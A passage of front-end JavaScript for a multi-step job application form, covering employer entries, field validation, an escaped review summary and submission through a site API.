  const reviewSummary = {
    personal: document.querySelector('[data-summary="personal"]'),
    role: document.querySelector('[data-summary="role"]'),
    experience: document.querySelector('[data-summary="experience"]'),
    interview: document.querySelector('[data-summary="interview"]'),
  };

  const state = {
    currentStep: 1,
    isSubmitting: false,
    applicationId: '',
  };

  const employerList = applicationForm.querySelector('[data-employers-list]');
  const addEmployerButton = applicationForm.querySelector('[data-add-employer]');
  const updateEmployerEntries = () => {
    const entries = Array.from(applicationForm.querySelectorAll('[data-employer-entry]'));
    entries.forEach((entry, index) => {
      entry.querySelector('[data-employer-title]').textContent = `Employer ${index + 1}`;
      entry.querySelectorAll('[data-employer-field]').forEach((field) => {
        const fieldName = field.dataset.employerField;
        const label = entry.querySelector(`label[for="${field.id}"]`);
        field.id = `previous-employer-${fieldName}-${index}`;
        field.name = `previousEmployers[${index}][${fieldName}]`;
        if (label) {
          label.htmlFor = field.id;
        }
      });
      entry.querySelector('[data-remove-employer]').hidden = entries.length === 1;
    });
  };

  const getPreviousEmployers = () => Array.from(applicationForm.querySelectorAll('[data-employer-entry]'))
    .map((entry) => Object.fromEntries(
      Array.from(entry.querySelectorAll('[data-employer-field]'))
        .map((field) => [field.dataset.employerField, field.value.trim()])
    ))
    .filter((employer) => Object.values(employer).some(Boolean));

  if (employerList && addEmployerButton) {
    updateEmployerEntries();
    addEmployerButton.addEventListener('click', () => {
      const entry = employerList.querySelector('[data-employer-entry]').cloneNode(true);
      entry.querySelectorAll('[data-employer-field]').forEach((field) => {
        field.value = '';
      });
      employerList.append(entry);
      updateEmployerEntries();
      entry.querySelector('[data-employer-field="company"]').focus();
    });

    employerList.addEventListener('click', (event) => {
      if (event.target.closest('[data-remove-employer]')) {
        event.target.closest('[data-employer-entry]').remove();
        updateEmployerEntries();
      }
    });
  }

  const getFieldValue = (name) => {
    const field = applicationForm.querySelector(`[name="${name}"]`);
    if (!field) {
      return '';
    }

    if (field.type === 'checkbox') {
      return field.checked ? 'Yes' : 'No';
    }

    if (field.type === 'radio') {
      const selected = applicationForm.querySelector(`input[name="${name}"]:checked`);
      return selected ? selected.value : '';
    }

    if (field.type === 'file') {
      return field.files && field.files[0] ? field.files[0].name : '';
    }

    if (field.matches('select')) {
      return field.value || '';
    }

    return field.value.trim();
  };

  const setError = (fieldName, message) => {
    const errorEl = applicationForm.querySelector(`[data-error-for="${fieldName}"]`);
    if (errorEl) {
      errorEl.textContent = message;
    }
  };

  const clearError = (fieldName) => {
    setError(fieldName, '');
  };

  const formatListValue = (value) => value || '—';

  const renderSummary = () => {
    const personal = [
      ['Full name', `${getFieldValue('firstName')} ${getFieldValue('lastName')}`.trim() || '—'],
      ['Email', formatListValue(getFieldValue('email'))],
      ['Phone', formatListValue(getFieldValue('phone'))],
      ['City', formatListValue(getFieldValue('city'))],
      ['State', formatListValue(getFieldValue('state'))],
    ];

    const role = [
      ['Position', formatListValue(getFieldValue('position'))],
      ['Work location', formatListValue(getFieldValue('workLocation'))],
      ['Employment type', formatListValue(getFieldValue('employmentType'))],
      ['Start availability', formatListValue(getFieldValue('availability'))],
      ['Work authorization', formatListValue(getFieldValue('workAuthorization'))],
      ['Preferred schedule', formatListValue(getFieldValue('preferredSchedule'))],
      ['Salary expectations', formatListValue(getFieldValue('salaryExpectation'))],
    ];

    const experience = [
      ['Customer service experience', formatListValue(getFieldValue('customerServiceExperience'))],
      ['Years of experience', formatListValue(getFieldValue('yearsExperience'))],
      ['Previous employers', formatListValue(getPreviousEmployers().map((employer) => {
        const details = [employer.company, employer.jobTitle].filter(Boolean).join(' - ');
        const dates = [employer.startDate, employer.endDate].filter(Boolean).join(' to ');
        return [details, dates, employer.responsibilities].filter(Boolean).join('; ');
      }).join(' | '))],
      ['Remote experience', formatListValue(getFieldValue('remoteExperience'))],
      ['Education', formatListValue(getFieldValue('educationLevel'))],
      ['Resume filename', formatListValue(getFieldValue('resume'))],
    ];

    const interview = [
      ['Preferred date', formatListValue(getFieldValue('interviewDate'))],
      ['Preferred time', formatListValue(getFieldValue('interviewTime'))],
      ['Time zone', formatListValue(getFieldValue('interviewTimeZone'))],
    ];

    const renderPairs = (target, entries) => {
      target.innerHTML = entries
        .map(
          ([label, value]) => `
            <div>
              <dt>${escapeHTML(label)}</dt>
              <dd>${escapeHTML(value)}</dd>
            </div>
          `
        )
        .join('');
    };

    const escapeHTML = (value) => String(value).replace(/[&<>"']/g, (character) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;',
    })[character]);

    renderPairs(reviewSummary.personal, personal);
    renderPairs(reviewSummary.role, role);
    renderPairs(reviewSummary.experience, experience);
    renderPairs(reviewSummary.interview, interview);
  };

  const validateEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  const validatePhone = (phone) => /^\+?[0-9()\-\s]{7,}$/.test(phone);

  const validateStep = (stepNumber) => {
    const fieldsToValidate = {
      1: ['firstName', 'lastName', 'email', 'phone', 'city', 'state'],
      2: ['position', 'workLocation', 'employmentType', 'availability', 'workAuthorization', 'preferredSchedule'],
      3: ['customerServiceExperience', 'remoteExperience', 'resume'],
      4: ['interviewDate', 'interviewTime', 'interviewTimeZone'],
    };

    const requiredFields = fieldsToValidate[stepNumber] || [];
    let valid = true;

    requiredFields.forEach((fieldName) => {
      const value = getFieldValue(fieldName);
      let message = '';

      if (fieldName === 'resume') {
        const resumeInput = document.getElementById('resume-file');
        const resumeFile = resumeInput && resumeInput.files && resumeInput.files[0] ? resumeInput.files[0] : null;
        if (!resumeFile) {
          message = 'Please upload your resume.';
          valid = false;
        } else {
          const allowedTypes = ['application/pdf', 'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'];
          const isAllowedType = allowedTypes.includes(resumeFile.type) || /\.(pdf|doc|docx)$/i.test(resumeFile.name);
          const isAllowedSize = resumeFile.size <= 10 * 1024 * 1024;

          if (!isAllowedType) {
            message = 'Resume must be a PDF, DOC, or DOCX file.';
            valid = false;
          } else if (!isAllowedSize) {
            message = 'Resume must be 10 MB or smaller.';
            valid = false;
          }
        }
      } else if (fieldName === 'position') {
        if (!value) {
          message = 'This field is required.';
          valid = false;
        }
      } else if (fieldName === 'email') {
        if (!value) {
          message = 'Please enter your email address.';
          valid = false;
        } else if (!validateEmail(value)) {
          message = 'Please enter a valid email address.';
          valid = false;
        }
      } else if (fieldName === 'phone') {
        if (!value) {
          message = 'Please enter your phone number.';
          valid = false;
        } else if (!validatePhone(value)) {
          message = 'Please enter a valid phone number.';
          valid = false;
        }
      } else if (fieldName === 'customerServiceExperience' || fieldName === 'remoteExperience') {
        if (!value) {
          message = 'Please select an option.';
          valid = false;
        }
      } else if (!value) {
        message = 'This field is required.';
        valid = false;
      }

      setError(fieldName, message);
    });

    if (stepNumber === 4) {
      const interviewDate = document.getElementById('interview-date');
      if (interviewDate && interviewDate.value) {
        const selectedDate = new Date(`${interviewDate.value}T00:00:00`);
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        if (selectedDate < today) {
          setError('interviewDate', 'Please select a future date.');
          valid = false;
        }
      }
    }

    return valid;
  };

  const updateStepButtons = () => {
    const currentStep = state.currentStep;
    const isFinalReview = currentStep === 5;

    if (currentStep === 1) {
      backButton.hidden = true;
    } else {
      backButton.hidden = false;
    }

    if (isFinalReview) {
      continueButton.hidden = true;
      submitButton.hidden = false;
      continueButton.disabled = true;
    } else {
      continueButton.hidden = false;
      submitButton.hidden = true;
      continueButton.disabled = !validateCurrentStep();
    }

    if (state.currentStep === 6) {
      backButton.hidden = true;
      continueButton.hidden = true;
      submitButton.hidden = true;
    }
  };

  const showStep = (stepNumber) => {
    state.currentStep = stepNumber;

    steps.forEach((step) => {
      step.classList.toggle('active', Number(step.dataset.step) === stepNumber);
    });

    stepIndicators.forEach((indicator) => {
      const indicatorStep = Number(indicator.dataset.stepIndicator);
      indicator.classList.toggle('active', indicatorStep === stepNumber);
      indicator.classList.toggle('completed', indicatorStep < stepNumber);
    });

    if (stepNumber === 5) {
      renderSummary();
    }

    updateStepButtons();
  };

  const validateCurrentStep = () => {
    const currentStep = state.currentStep;
    if (currentStep === 1 || currentStep === 2 || currentStep === 3 || currentStep === 4) {
      return validateStep(currentStep);
    }
    return true;
  };

  const goToNextStep = () => {
    if (!validateCurrentStep()) {
      return;
    }

    if (state.currentStep < 5) {
      showStep(state.currentStep + 1);
    }
  };

  const goToPreviousStep = () => {
    if (state.currentStep > 1) {
      showStep(state.currentStep - 1);
    }
  };

  const finalizeSubmission = async () => {
    const certification = applicationForm.querySelector('#application-certification');
    if (!certification.checked) {
      setError('certification', 'Please confirm that the information is accurate and complete.');
      return;
    }
    clearError('certification');

    const validAll = [1, 2, 3, 4].every((step) => validateStep(step));
    if (!validAll) {
      const firstInvalidStep = [1, 2, 3, 4].find((step) => !validateStep(step));
      if (firstInvalidStep) {
        showStep(firstInvalidStep);
      }
      return;
    }

    if (state.isSubmitting) {
      return;
    }

    state.isSubmitting = true;
    submitButton.disabled = true;
    submitButton.textContent = 'Submitting...';

    const payload = {
      firstName: getFieldValue('firstName'),
      lastName: getFieldValue('lastName'),
      email: getFieldValue('email'),
      phone: getFieldValue('phone'),
      city: getFieldValue('city'),
      state: getFieldValue('state'),
      position: getFieldValue('position'),
      workLocation: getFieldValue('workLocation'),
      employmentType: getFieldValue('employmentType'),
      availability: getFieldValue('availability'),
      workAuthorization: getFieldValue('workAuthorization'),
      preferredSchedule: getFieldValue('preferredSchedule'),
      salaryExpectation: getFieldValue('salaryExpectation'),
      customerServiceExperience: getFieldValue('customerServiceExperience'),
      yearsExperience: getFieldValue('yearsExperience'),
      remoteExperience: getFieldValue('remoteExperience'),
      educationLevel: getFieldValue('educationLevel'),
      resume: getFieldValue('resume'),
      interviewDate: getFieldValue('interviewDate'),
      interviewTime: getFieldValue('interviewTime'),
      interviewTimeZone: getFieldValue('interviewTimeZone'),
      additionalInfo: getFieldValue('additionalInfo'),
      schedulingNotes: getFieldValue('schedulingNotes'),
    };

    try {
      const response = await window.JobApplicationAPI.submit(payload);
      if (!response || response.ok === false) {
        throw new Error(response?.message || 'Submission failed.');
      }
      state.applicationId = response.applicationId || `CH-${Date.now().toString().slice(-8)}`;
      document.getElementById('generated-application-id').textContent = state.applicationId;
      showStep(6);
    } catch (error) {
      const submissionError = document.createElement('p');
      submissionError.className = 'error-message';
      submissionError.textContent = error.message || 'Something went wrong while submitting your application.';
      const actions = document.querySelector('.application-actions');
      if (actions) {
        actions.insertAdjacentElement('beforeend', submissionError);
      }
    } finally {
      state.isSubmitting = false;
      submitButton.disabled = false;
      submitButton.textContent = 'Submit Application';
    }
  };

  applicationForm.querySelectorAll('input, select, textarea').forEach((field) => {
    if (field.name === 'certification') {
      return;
    }

    field.addEventListener('input', () => {
      if (field.name) {
        clearError(field.name);
      }
      if (field.name === 'resume' && field.files && field.files[0]) {
        document.getElementById('resume-file-name').textContent = field.files[0].name;
      }
      if (field.name === 'relevantExperience') {
        const count = document.getElementById('relevant-experience-count');
        if (count) {
          count.textContent = String(field.value.length || 0);
        }
      }
      if (field.name === 'additionalInfo') {
        const count = document.getElementById('additional-info-count');
        if (count) {
          count.textContent = String(field.value.length || 0);
        }
      }

      updateStepButtons();
    });

    field.addEventListener('change', () => {
      if (field.name === 'resume' && field.files && field.files[0]) {
        document.getElementById('resume-file-name').textContent = field.files[0].name;
      }
      updateStepButtons();
    });
  });

  document.querySelectorAll('[data-edit-step]').forEach((button) => {
    button.addEventListener('click', () => {
      showStep(Number(button.dataset.editStep));
    });
  });

  const dateInput = document.getElementById('interview-date');
  if (dateInput) {
    const today = new Date();
    const iso = new Date(today.getTime() - today.getTimezoneOffset() * 60000).toISOString().split('T')[0];
    dateInput.min = iso;
  }

  continueButton?.addEventListener('click', () => {
    if (state.currentStep < 5) {
      goToNextStep();
    }
  });

  backButton?.addEventListener('click', () => {
    if (state.currentStep > 1) {
      goToPreviousStep();
    }
  });

  submitButton?.addEventListener('click', () => {
    finalizeSubmission();
  });

  closeButton?.addEventListener('click', () => {
    window.location.href = '../../../index.html';
  });

  const checkbox = applicationForm.querySelector('#application-certification');
  checkbox?.addEventListener('change', () => {
    clearError('certification');
  });

  showStep(1);
}
